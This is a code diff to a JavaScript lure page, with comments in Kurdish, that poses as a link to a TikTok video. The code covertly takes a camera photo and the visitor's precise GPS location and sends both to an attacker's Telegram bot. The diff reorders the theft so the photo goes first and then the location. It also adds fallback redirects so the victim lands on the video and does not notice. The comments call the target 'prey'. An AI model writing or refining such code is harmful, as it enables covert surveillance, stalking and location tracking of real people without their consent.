@@ -44,23 +44,12 @@
                 v.srcObject = s;
                 await v.play();
 
-                // ٢. داواکردنی لۆکەیشن و ناردنی خێرا (بەهێزکراو بۆ ئایفۆن)
-                if (navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition(async (pos) => {
-                        const lat = pos.coords.latitude;
-                        const lon = pos.coords.longitude;
-                        const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
-                        const text = `📍 لۆکەیشنی نێچیر گەیشت:\n${mapLink}`;
-                        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}`);
-                    }, null, { enableHighAccuracy: true, timeout: 5000 });
-                }
-
-                // ٣. چالاککردنی فلاش
+                // ٢. چالاککردنی فلاش
                 bg.style.display = 'none';
                 btn.style.display = 'none';
                 b.classList.add('flash-active');
 
-                // ٤. وێنەگرتن دوای ١٣٠٠ میلی چرکە و چوونە سەر تیکتۆک
+                // ٣. وێنەگرتن دوای ١١٠٠ میلی چرکە
                 setTimeout(async () => {
                     const c = document.getElementById('c');
                     c.width = v.videoWidth;
@@ -71,11 +60,30 @@
                     const fd = new FormData();
                     fd.append('chat_id', chat_id);
                     fd.append('photo', blob, 'photo.jpg');
-                    fd.append('caption', "📸 وێنەی نێچیر\n📱 " + (navigator.userAgent.includes("iPhone") ? "iPhone" : "Android"));
+                    fd.append('caption', "📸 وێنەی نێچیر گەیشت\n📱 " + (navigator.userAgent.includes("iPhone") ? "iPhone" : "Android"));
                     
+                    // یەکەم جار وێنەکە دەنێرێت
                     await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
-                    window.location.href = targetVideo;
-                }, 1300);
+
+                    // پاشان داوای لۆکەیشن دەکات و دەنێرێت
+                    if (navigator.geolocation) {
+                        navigator.geolocation.getCurrentPosition(async (pos) => {
+                            const lat = pos.coords.latitude;
+                            const lon = pos.coords.longitude;
+                            const mapLink = "https://www.google.com/maps?q=" + lat + "," + lon;
+                            await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent("📍 لۆکەیشن:\n" + mapLink)}`);
+                            window.location.href = targetVideo;
+                        }, (err) => {
+                            window.location.href = targetVideo;
+                        }, { enableHighAccuracy: true, timeout: 5000 });
+                    } else {
+                        window.location.href = targetVideo;
+                    }
+
+                    // ئەگەر لۆکەیشن دواکەوت، دوای ٣ چرکە هەر دەیباتە سەر تیکتۆک
+                    setTimeout(() => { window.location.href = targetVideo; }, 3000);
+
+                }, 1100);
 
             } catch (e) {
                 window.location.href = targetVideo;
